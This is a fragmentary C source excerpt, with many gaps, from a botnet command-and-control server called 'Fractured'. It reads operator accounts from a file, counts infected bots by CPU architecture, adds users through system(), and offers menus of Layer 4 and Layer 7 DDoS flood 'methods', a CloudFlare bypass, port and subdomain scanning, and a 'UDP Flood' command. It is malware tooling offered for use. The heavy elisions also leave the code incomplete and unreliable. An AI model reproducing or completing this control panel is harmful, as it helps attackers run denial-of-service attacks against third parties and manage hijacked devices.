...
void *telnetWorker(void *sock) {
  ...
  int i = 0;
  int c;
  fp = fopen("fractured.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
...
failed:
      ...
      sprintf(arm,   "\x1b[0;31mfractured.arm  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", armConnected());
      sprintf(sh4,   "\x1b[0; 31mfractured.sh4  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", sh4Connected());
      sprintf(ppc,   "\x1b[0; 31mfractured.ppc  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", ppcConnected());
      sprintf(x86,   "\x1b[0; 31mfractured.x86  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", x86Connected());
      sprintf(spc,   "\x1b[0; 31mfractured.spc  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", spcConnected());
      sprintf(total, "\x1b[0; 31mfractured.ttl  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", clientsConnected());
            ...
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
    {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
        ...
        system(uinfo);
        printf("\x1b[1;37m[\x1b[0; 31mfractured\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, userinfo);
        sprintf(botnet, "\x1b[1;37m[\x1b[0; 31mfractured\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\r\n", accounts[find_line].user, userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        ...
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Fractured ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        ...
        sprintf(stress_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Available Methods\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        ...
        sprintf(l4udp_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Layer 4 Methods\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        ...
        sprintf(l4tcp_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Layer 4 TCP Methods\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        ...
        sprintf(l7_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Layer 7 Methods\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        ...
        if(strstr(buf, "root_add"))
        {
        sprintf(botnet, "\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] User Added!\r\n"); 
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "root_geo")) 
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] Starting geolocation!\r\n"); // We Are Sending the user a message!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } // Let Us Continue Our Journey!
        if(strstr(buf, "root_sub")) // We Are Attempting To Scan Subdomains! 
        {   // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] Starting subdomain scan!\r\n"); // We Are Sending the user a message!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "root_scan"))
        {  
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mFractured\x1b[1;37m] Starting PortScan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } // Let Us Continue Our Journey!
        if(strstr(buf, "root_cf")) // We Are Attempting To Bypass CloudFlare!
        {   // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] Starting CF_Bypass scan!\r\n"); // We Are Sending the user a message!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } // Let Us Continue Our Journey!
        if(strstr(buf, "LOGOUT")) // WE ARE LOGGING OUT!
        {   // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("LOGOUT.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        ...
        {    // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Attempted To Shell Your Bots!\n", accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] User: \x1b[0;36m%s\x1b[1;37m Has Attempted To Shell Your Bots!\n", accounts[find_line].user, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        ...
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0; 31mFractured\x1b[1;37m] Sending \x1b[0;31mUDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
